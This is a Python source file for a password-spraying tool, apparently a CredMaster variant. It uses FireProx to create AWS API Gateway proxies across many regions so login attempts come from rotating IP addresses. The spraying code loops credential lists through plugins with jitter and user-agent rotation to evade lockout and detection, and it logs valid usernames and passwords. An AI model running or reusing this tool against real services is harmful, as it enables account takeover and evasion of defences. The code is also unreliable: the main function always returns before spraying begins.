#!/usr/bin/env python3
# from zipfile import *
import threading, queue, argparse, datetime, json, importlib, random, os, time
from fire import FireProx

credentials = { 'accounts':[] }
regions = [
	'us-east-2', 'us-east-1','us-west-1','us-west-2','eu-west-3',
	'ap-northeast-1','ap-northeast-2','ap-south-1',
	'ap-southeast-1','ap-southeast-2','ca-central-1',
	'eu-central-1','eu-west-1','eu-west-2','sa-east-1',
]

lock = threading.Lock()
q_spray = queue.Queue()

outfile = None

start_time = None
end_time = None
time_lapse = None
results = []
cancelled = False

def main(args,pargs):

	global start_time, end_time, time_lapse, outfile, cancelled

	# assign variables
	thread_count = args.threads
	plugin = args.plugin
	username_file = args.userfile
	password_file = args.passwordfile
	userpass_file = args.userpassfile
	profile_name = args.profile_name
	access_key = args.access_key
	secret_access_key = args.secret_access_key
	session_token = args.session_token
	useragent_file = args.useragentfile
	delay = args.delay
	outfile = args.outfile
	passwordsperdelay = args.passwordsperdelay
	jitter = args.jitter
	jitter_min = args.jitter_min

	# input exception handling
	if outfile != None:
		outfile = outfile + "-credmaster.txt"
		if os.path.exists(outfile):
			log_entry("File {} already exists, try again with a unique file name".format(outfile))
			return

	if args.config != None:
		log_entry("Loading AWS configuration details from file: {}".format(args.config))
		aws_dict = json.loads(open(args.config).read())
		access_key = aws_dict['access_key']
		secret_access_key = aws_dict['secret_access_key']
		profile_name = aws_dict['profile_name']
		session_token = aws_dict['session_token']

	if access_key == None and secret_access_key == None and session_token == None and profile_name == None:
		log_entry("No FireProx access arguments settings configured, add access keys/session token or fill out config file")
		return

	if args.clean:
		clear_all_apis(access_key, secret_access_key, profile_name, session_token)
		return
	elif args.api_destroy != None:
		destroy_single_api(args.api_destroy, access_key, secret_access_key, profile_name, session_token)
		return
	elif args.api_list:
		list_apis(access_key, secret_access_key, profile_name, session_token)
		return
	elif userpass_file == None and (username_file == None or password_file == None):
		log_entry("User file and password file (or userpass file) must be provided")
		return
	else:
		log_entry("Please provide plugin & username/password information, or provide API utility options (api_list/api_destroy/clean)")
		return

	if jitter_min is not None and jitter is None:
		log_entry("--jitter flag must be set with --jitter-min flag")
		return
	elif jitter_min is not None and jitter is not None and jitter_min >= jitter:
		log_entry("--jitter flag must be greater than --jitter-min flag")
		return

	pluginargs = {}
	if len(pargs) % 2 == 1:
		pargs.append(None)
	for i in range(0,len(pargs)-1):
		key = pargs[i].replace("--","")
		pluginargs[key] = pargs[i+1]

	start_time = datetime.datetime.utcnow()
	log_entry('Execution started at: {}'.format(start_time))

	# Check with plugin to make sure it has the data that it needs
	validator = importlib.import_module('plugins.{}'.format(plugin))
	if getattr(validator,"validate",None) is not None:
		valid, errormsg, pluginargs = validator.validate(pluginargs, args)
		if not valid:
			log_entry(errormsg)
			return
	else:
		log_entry("No validate function found for plugin: {}".format(plugin))

	# this is the original URL, NOT the fireproxy one. Don't use this in your sprays!
	url = pluginargs['url']

	threads = []

	try:
		# Create lambdas based on thread count
		apis = load_apis(access_key, secret_access_key, profile_name, session_token, thread_count, url)

		# do test connection / fingerprint
		useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
		connect_success, testconnect_output, pluginargs = validator.testconnect(pluginargs, args, apis['us-east-2'], useragent)
		log_entry(testconnect_output)

		if not connect_success:
			destroy_apis(apis, access_key, secret_access_key, profile_name, session_token)
			return

		# Print stats
		display_stats(apis)

		log_entry("Starting Spray...")

		count = 0
		passwords = ["Password123"]
		if userpass_file == None:
			passwords = load_file(password_file)

		for password in passwords:

			load_credentials(username_file, password, useragent_file, userpass=userpass_file)

			# Start Spray
			threads = []
			for api_key in apis:
				t = threading.Thread(target = spray_thread, args = (api_key, apis[api_key], plugin, pluginargs, jitter, jitter_min) )
				threads.append(t)
				t.start()

			for t in threads:
				t.join()

			count = count + 1

			if delay == None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
				if userpass_file != None:
					log_entry('Completed spray with user-pass file {}'.format(userpass_file, datetime.datetime.utcnow()))
				else:
					log_entry('Completed spray with password {} at {}'.format(password, datetime.datetime.utcnow()))
				continue
			elif count != passwordsperdelay:
				log_entry('Completed spray with password {} at {}, moving on to next password...'.format(password, datetime.datetime.utcnow()))
				continue
			else:
				log_entry('Completed spray with password {} at {}, sleeping for {} minutes before next password spray'.format(password, datetime.datetime.utcnow(), delay))
				log_entry('Valid credentials discovered: {}'.format(len(results)))
				for success in results:
					log_entry('Valid: {}:{}'.format(success['username'], success['password']))
				count = 0
				time.sleep(delay * 60)

		# Remove AWS resources
		destroy_apis(apis, access_key, secret_access_key, profile_name, session_token)

	except KeyboardInterrupt:
		log_entry("KeyboardInterrupt detected, cleaning up APIs")
		try:
			log_entry("Finishing active requests")
			cancelled = True
			for t in threads:
				t.join()
			destroy_apis(apis, access_key, secret_access_key, profile_name, session_token)
		except KeyboardInterrupt:
			log_entry("Second KeyboardInterrupt detected, unable to clean up APIs :( try the --clean option")

	# Capture duration
	end_time = datetime.datetime.utcnow()
	time_lapse = (end_time-start_time).total_seconds()

	# Print stats
	display_stats(apis, False)


def load_apis(access_key, secret_access_key, profile_name, session_token, thread_count, url):
	threads = thread_count

	if thread_count > len(regions):
		log_entry("Thread count over maximum, reducing to 15")
		threads = len(regions)

	log_entry('Creating {} API Gateways for {}'.format(threads, url))

	apis = {}

	# slow but multithreading this causes errors in boto3 for some reason :(
	for x in range(0,threads):
		apis[regions[x]] = create_api(access_key, secret_access_key, profile_name,	session_token, regions[x], url.strip())
		log_entry('Created API - Region: {} ID: ({}) - {} => {}'.format(regions[x], apis[regions[x]]['api_gateway_id'], apis[regions[x]]['proxy_url'], url))

	return apis


def create_api(access_key, secret_access_key, profile_name, session_token, region, url):

	args, help_str = get_fireprox_args(access_key, secret_access_key, profile_name, session_token, "create", region, url=url)
	fp = FireProx(args, help_str)
	resource_id, proxy_url = fp.create_api(url)
	return { "api_gateway_id" : resource_id, "proxy_url" : proxy_url }


def get_fireprox_args(access_key, secret_access_key, profile_name, session_token, command, region, url = None, api_id = None):

	args = {}
	args["access_key"] = access_key
	args["secret_access_key"] = secret_access_key
	args["url"] = url
	args["command"] = command
	args["region"] = region
	args["api_id"] = api_id
	args["profile_name"] = profile_name
	args["session_token"] = session_token

	help_str = "Error, inputs cause error."

	return args, help_str


def display_stats(apis, start=True):
	if start:
		api_count = 0
		for lc, val in apis.items():
			if val:
				api_count += 1

		log_entry('Total Regions Available: {}'.format(len(regions)))
		log_entry('Total API Gateways: {}'.format(api_count))


	if end_time and not start:
		log_entry('End Time: {}'.format(end_time))
		log_entry('Total Execution: {} seconds'.format(time_lapse))
		log_entry('Valid credentials identified: {}'.format(len(results)))

		for cred in results:
			log_entry('VALID - {}:{}'.format(cred['username'],cred['password']))


def list_apis(access_key, secret_access_key, profile_name, session_token):

	for region in regions:

		args, help_str = get_fireprox_args(access_key, secret_access_key, profile_name, session_token, "list", region)
		fp = FireProx(args, help_str)
		active_apis = fp.list_api()
		log_entry("Region: {} - total APIs: {}".format(region, len(active_apis)))

		if len(active_apis) != 0:
			for api in active_apis:
				log_entry("API Info --  ID: {}, Name: {}, Created Date: {}".format(api['id'], api['name'], api['createdDate']))


def destroy_single_api(api, access_key, secret_access_key, profile_name, session_token):

	log_entry("Destroying single API, locating region...")
	for region in regions:

		args, help_str = get_fireprox_args(access_key, secret_access_key, profile_name, session_token, "list", region)
		fp = FireProx(args, help_str)
		active_apis = fp.list_api()

		for api1 in active_apis:
			if api1['id'] == api:
				log_entry("API found in region {}, destroying...".format(region))
				fp.delete_api(api)
				return

		log_entry("API not found")


def destroy_apis(apis, access_key, secret_access_key, profile_name, session_token):

	for api_key in apis:

		args, help_str = get_fireprox_args(access_key, secret_access_key, profile_name, session_token, "delete", api_key, api_id = apis[api_key]['api_gateway_id'])
		fp = FireProx(args, help_str)
		log_entry('Destroying API ({}) in region {}'.format(args['api_id'], api_key))
		fp.delete_api(args["api_id"])


def clear_all_apis(access_key, secret_access_key, profile_name, session_token):

	log_entry("Clearing APIs for all regions")
	clear_count = 0

	for region in regions:

		args, help_str = get_fireprox_args(access_key, secret_access_key, profile_name, session_token, "list", region)
		fp = FireProx(args, help_str)
		active_apis = fp.list_api()
		count = len(active_apis)
		err = "skipping"
		if count != 0:
			err = "removing"
		log_entry("Region: {}, found {} APIs configured, {}".format(region, count, err))

		for api in active_apis:
			if "fireprox" in api['name']:
				fp.delete_api(api['id'])
				clear_count += 1

	log_entry("APIs removed: {}".format(clear_count))


def spray_thread(api_key, api_dict, plugin, pluginargs, jitter=None, jitter_min=None):

	global results

	try:
		plugin_authentiate = getattr(importlib.import_module('plugins.{}.{}'.format(plugin, plugin)), '{}_authenticate'.format(plugin))
	except Exception as ex:
		log_entry("Error: Failed to import plugin with exception")
		log_entry("Error: {}".format(ex))
		exit()

	while not q_spray.empty() and not cancelled:

		try:
			cred = q_spray.get_nowait()

			if jitter is not None:
				if jitter_min is None:
					jitter_min = 0
				time.sleep(random.randint(jitter_min,jitter))

			response = plugin_authentiate(api_dict['proxy_url'], cred['username'], cred['password'], cred['useragent'], pluginargs)

			if not response['error']:
				log_entry("{}: {}".format(api_key,response['output']))
			else:
				log_entry("ERROR: {}: {} - {}".format(api_key,cred['username'],response['output']))

			if response['success']:
				results.append( {'username' : cred['username'], 'password' : cred['password']} )

			q_spray.task_done()
		except Exception as ex:
			log_entry("ERROR: {}: {} - {}".format(api_key,cred['username'],ex))


def load_credentials(user_file, password, useragent_file=None, userpass=None):

	users = []
	if userpass == None:
		log_entry('Loading credentials from {} with password {}'.format(user_file, password))
		users = load_file(user_file)
	else:
		log_entry('Loading credentials from {} as user-pass file'.format(userpass))
		users = load_file(userpass)


	if useragent_file is not None:
		useragents = load_file(useragent_file)
	else:
		# randomly selected
		useragents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"]

	for user in users:
		if userpass != None:
			password = ":".join(user.split(':')[1:]).strip()
			user = user.split(':')[0].strip()
		cred = {}
		cred['username'] = user
		cred['password'] = password
		cred['useragent'] = random.choice(useragents)

		q_spray.put(cred)


def load_file(filename):

	if filename:
		return [line.strip() for line in open(filename, 'r')]


def log_entry(entry):

	global lock

	lock.acquire()

	ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
	print('[{}] {}'.format(ts, entry))

	if outfile is not None:
		with open(outfile, 'a+') as file:
			file.write('[{}] {}'.format(ts, entry))
			file.write('\n')
			file.close()

	lock.release()


if __name__ == '__main__':

	parser = argparse.ArgumentParser()
	parser.add_argument('--plugin', help='Spray plugin', default=None, required=False)
	parser.add_argument('-u', '--userfile', default=None, required=False, help='Username file')
	parser.add_argument('-p', '--passwordfile', default=None, required=False, help='Password file')
	parser.add_argument('-f', '--userpassfile', default=None, required=False, help='Username-Password file (one-to-one map, colon separated)')
	parser.add_argument('-a', '--useragentfile', default=None, required=False, help='Useragent file')
	parser.add_argument('-o', '--outfile', default=None, required=False, help='Output file to write contents (omit extension)')
	parser.add_argument('-t', '--threads', type=int, default=1, help='Thread count (default 1, max 15)')
	parser.add_argument('-j', '--jitter', type=int, default=None, required=False, help='Jitter delay between requests in seconds (applies per-thread)')
	parser.add_argument('-m', '--jitter_min', type=int, default=None, required=False, help='Minimum jitter time in seconds, defaults to 0')
	parser.add_argument('-d', '--delay', type=int, required=False, help='Delay between unique passwords, in minutes')
	parser.add_argument('--passwordsperdelay', type=int, default=1, required=False, help='Number of passwords to be tested per delay cycle')
	parser.add_argument('--profile_name', type=str, default=None, help='AWS Profile Name to store/retrieve credentials')
	parser.add_argument('--access_key', type=str, default=None, help='AWS Access Key')
	parser.add_argument('--secret_access_key', type=str, default=None, help='AWS Secret Access Key')
	parser.add_argument('--session_token', type=str, default=None, help='AWS Session Token')
	parser.add_argument('--config', type=str, default=None, help='Authenticate to AWS using config file aws.config')
	parser.add_argument('--clean', default=False, action="store_true", help='Clean up all fireprox AWS APIs from every region, warning irreversible')
	parser.add_argument('--api_destroy', type=str, default=None, help='Destroy single API instance, by API ID')
	parser.add_argument('--api_list', default=False, action="store_true", help='List all fireprox APIs')

	args,pluginargs = parser.parse_known_args()

	main(args,pluginargs)
